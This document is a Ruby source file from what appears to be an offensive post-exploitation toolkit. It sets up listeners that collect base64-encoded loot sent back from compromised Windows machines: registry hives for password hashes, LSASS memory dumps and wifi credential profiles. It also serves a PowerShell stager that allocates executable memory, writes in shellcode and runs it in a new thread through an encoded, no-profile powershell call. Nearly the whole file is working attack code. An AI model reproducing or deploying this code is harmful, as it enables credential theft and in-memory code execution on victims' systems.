#!/usr/bin/env ruby
require 'socket'
require_relative 'core'
include MainCommands
class ServerSetUp
  def get_host
    host_name = [(get_input('Enter the host ip to listen on: ') ), $stdin.gets.rstrip][1]
    ip = host_name.split('.')
    if ip[0] == nil or ip[1] == nil or ip[2] == nil or ip[3] == nil 
      print_error("Not a valid IP\n") 
      get_host()
    end 
    print_success("Using #{host_name} as server\n")
    return host_name
  end
  def get_port
    port = [(get_input('Enter the port you would like to use or leave blank for [443]: ') ), $stdin.gets.rstrip][1]
    if port == ''
      port = '443'
      print_success("Using #{port}\n")
      return port
    elsif not (1..65535).cover?(port.to_i)
      print_error("Not a valid port\n")
      sleep(1)
      port()
    else 
      print_success("Using #{port}\n")
      return port
    end
  end
  def hash_server(port,ssl=nil,host=nil)
    Dir.mkdir(loot_dir) if not Dir.exists?(loot_dir)
    x = 0
    if ssl
      print_info("Starting SSL Server!\n")
      server = ssl_setup(host,port.to_i)
    else
      print_info("Starting Server!\n")
      server = TCPServer.open(port.to_i)
    end
    loop{
      Thread.start(server.accept) do |client|
        print_info("Client Connected.\n")
        file_name = client.gets
        print_success("Got #{file_name.strip} file!\n")
        print_info("Getting Data!\n")
        out_put = client.gets
        print_info("Writing to File\n")
        File.open("#{loot_dir}#{file_name.strip}#{x}", 'w') {|f| f.write(Base64.decode64(out_put))}
        print_success("File Done!\n")
        if file_name == "sys\r\n"
          print_info("Trying to print Hashes!\n")
          print_hashes(x)
          x += 1
        end
      end
    }
    rescue => error
      print_error(error)
  end
  def lsass_server(port,ssl=nil,host=nil)
    Dir.mkdir(loot_dir) if not Dir.exists?(loot_dir)
    x = 0
    if ssl
      print_info("Starting SSL Server!\n")
      server = ssl_setup(host,port.to_i)
    else
      print_info("Starting Server!\n")
      server = TCPServer.open(port.to_i)
    end
    loop{   
      Thread.start(server.accept) do |client|
        print_info("Client Connected.\n")
        file_name = client.gets
        print_success("Got #{file_name.strip} file!\n")
        print_info("Getting Data\n")
        out_put = client.gets
        print_info("Writing to File\n")
        File.open("#{loot_dir}#{file_name.strip}#{x}.dmp", 'w') {|f| f.write(Base64.decode64(out_put))}
        print_success("File Done!\n")
        x += 1
      end   
    }
    rescue => error
    print_error(error)
  end
  def wifi_server(port,ssl=nil,host=nil)
    Dir.mkdir(loot_dir) if not Dir.exists?(loot_dir)
    if ssl
      print_info("Starting SSL Server!\n")
      server = ssl_setup(host,port.to_i)
    else
      print_info("Starting Server!\n")
      server = TCPServer.open(port.to_i)
    end
    loop{
      Thread.start(server.accept) do |client|
        file_name = client.gets
        print_success("Got #{file_name.strip} file!\n")
        print_info("Getting Data\n")
        out_put = client.gets()
        print_info("Writing to File\n")
        File.open("#{loot_dir}#{file_name.strip}.xml", 'w') {|f| f.write(Base64.decode64(out_put))}
        print_success("File Done!\n")
      end
    }
  rescue => error
    print_error(error)
  end
  def web_server
    print_info("Checking for Apache\n")
    sleep(2)
    if File.exists?('/usr/sbin/apache2')
      if File.exist?('/usr/sbin/service')
        @service_check = `service apache2 status`
      else
        print_error("Can't Find Startup Service")
        exit
      end
    elsif File.exists?('/usr/sbin/apachectl')
      if File.exists?('/usr/bin/systemctl')
        @systemd_check = `systemctl status httpd`
      else
        print_error("Can't Find Startup Service")
        exit
      end
    else
      print_error("Can't Find Apache!\n")
      exit
    end
    if @systemd_check =~ /inactive/ or @service_check =~ /NOT running/
      print_info("Starting Server\n")
      if File.exist?('/usr/bin/systemctl')
        out_put = `systemctl start httpd 2>&1`
        if out_put =~ /Access denied/
          print_error("Access Denied, Not Running as Root\n")
          exit
        else
          print_success("Server Started!\n")
          sleep(2)
        end
      elsif File.exist?('/usr/sbin/service')
        out_put = `service apache2 start`
        print_success("Server Started!\n")
        sleep(2)
      else
        print_error("Could Not Start Apache!\n")
        exit
      end
    elsif @systemd_check =~ /active/ or @service_check =~ /running/
      print_info("Server Already Running!\n")
      sleep(2)
    end 
    rescue => error
      print_error("#{error}\n")
      exit
  end
  def ruby_web_server(port,ssl=nil,host,shellcode)
    time = Time.now.localtime.strftime("%a %d %b %Y %H:%M:%S %Z")
    if ssl
      print_info("Starting SSL Server!\n")
      server = ssl_setup(host,port.to_i)
    else
      print_info("Starting Server!\n")
      server = TCPServer.open(host,port.to_i)
    end
    resp = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);)
    resp << %([DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);)
    resp << %([DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;)
    resp << %([Byte[]];[Byte[]]$sc = #{shellcode};$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);)
    resp << %(for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';)
    resp << %($gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\\syswow64\\WindowsPowerShell\\v1.0\\powershell";)
    resp << %($cmd = "-nop -noni -enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";})
    loop {
      Thread.start(server.accept) do |client|
        print_info("Client Connected!\n")
        headers = ["HTTP/1.1 200 OK",
                   "Date: #{time}",
                   "Server: Ruby",
                   "Content-Type: text/html; charset=iso-8859-1",
                   "Content-Length: #{resp.length}\r\n\r\n"].join("\r\n")
        client.print headers
        client.print "#{resp}\n"
        client.close
      end
    }
  end
  trap("INT") do
    print_info("Caught CTRL-C stopping server!\n")
    exit
  end
end